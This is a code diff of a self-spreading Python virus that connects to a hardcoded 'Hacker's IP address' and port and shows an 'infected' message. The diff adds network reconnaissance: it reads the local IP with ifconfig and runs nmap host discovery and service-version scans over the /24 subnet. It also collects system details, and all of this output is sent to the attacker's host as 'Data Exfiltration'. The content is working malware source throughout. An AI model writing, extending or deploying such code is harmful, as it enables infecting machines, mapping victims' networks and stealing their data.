@@ -8,10 +8,10 @@ import subprocess
 import glob
 import os
 import random
-import io
+import re
 
 # ----------- Variables -----------
-host = '127.0.0.1' #Hacker's IP address as a string
+host = '192.168.118.129' #Hacker's IP address as a string
 port = 9999
 target_os = None
 infection_message = "You've been infected!!"
@@ -20,6 +20,7 @@ target_file_type = ".foo"
 # ----------- Functions ----------- 
 
 # -- Infection Message -- 
+#region
 
 def post_infection_msg(target_os, infection_msg):
     print(target_os)
@@ -30,9 +31,9 @@ def post_infection_msg(target_os, infection_msg):
         ctypes.windll.user32.MessageBoxW(0, infection_msg, msg_box_title, 1)
     else:
         subprocess.run(['notify-send', msg_box_title, infection_msg])
+#endregion
 
 # -- Self Spread Functions --
-
 def is_end(line):
     return True if "# END OF SCRIPT" in line and (len(line.strip()) == len("# END OF SCRIPT")) else False 
 
@@ -198,9 +199,77 @@ function: send_data
 A wrapper for socket.send() which encodes automatically in utf-8.
 """
 def send_data(s, data):
-    s.send(f"{data}".encode('utf-8'))
+    s.send(f"{data}\n".encode('utf-8'))
 
 #endregion
+
+def get_ip():
+    try:
+        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
+
+        # Extract IP addresses using regex
+        ip_pattern = re.compile(r'inet\s+([\d.]+)')
+        ip_addresses = ip_pattern.findall(result.stdout)
+
+        for ip in ip_addresses:
+            if (ip.split('.')[0] in ['192', '10']):
+                return ip
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return None
+
+def get_network_addr():
+    ip = get_ip()
+
+    if ip == None:
+        return
+    
+    address_components = ip.split('.')
+    return f"{address_components[0]}.{address_components[1]}.{address_components[2]}.0/24"
+
+def get_sys_info(s):
+    send_data(s,"------------------- SYSTEM INFO -------------------")
+    send_data(s,f"Operating System: {platform.system()}")
+    send_data(s,f"OS Version: {platform.version()}")
+    send_data(s,f"Platform: {platform.platform()}")
+    send_data(s,f"Release: {platform.release()}")
+    send_data(s,f"Machine: {platform.machine()}")
+    send_data(s,f"Processor: {platform.processor()}")
+    send_data(s,f"Node Name: {platform.node()}")
+
+    if target_os == "Windows":
+        try:
+            send_data(s,f"Linux Distribution: {platform.linux_distribution()}")
+        except AttributeError:
+            send_data(s,"Linux Distribution: (Not Available)")
+    
+    if platform.system() == "Windows":
+        send_data(s,f"Windows Version: {platform.win32_ver()}")
+    
+    if platform.system() == "Darwin":
+        send_data(s,f"Mac Version:", {platform.mac_ver()})
+
+def find_hosts_on_network(s):
+    command = ['nmap', '-sn', get_network_addr()]
+
+    # Run the command and capture the output
+    result = subprocess.run(command, capture_output=True, text=True)
+    send_data(s,"------------------- HOSTS UP IN NETWORK -------------------")
+    send_data(s, result.stdout)
+
+def find_running_services(s):
+    # This defines the nmap and its arguments
+    command = ['nmap', '-sV', '-T4', '-v', get_network_addr()]
+
+    # Run the command and capture the output
+    result = subprocess.run(command, capture_output=True, text=True)
+
+    send_data(s,"------------------- SERVICES AND OPEN PORTS PERTAINING TO EACH HOST ON THE NETWORK -------------------")
+    send_data(s, result.stdout)
+
+
+
 
 # ----------- Main Operations ----------- 
 
@@ -217,7 +286,10 @@ send_data(s, f"Target OS: '{str(target_os)}'")
 post_infection_msg(target_os, infection_message)
 
 # (4) Data Exfiltration
-
+get_sys_info(s)
+find_hosts_on_network(s)
+find_running_services(s)
+    
 
 # 4.1 For now exfiltrate the type of OS that the host is, the pwd, 
 #      and the list of files in the current directory.
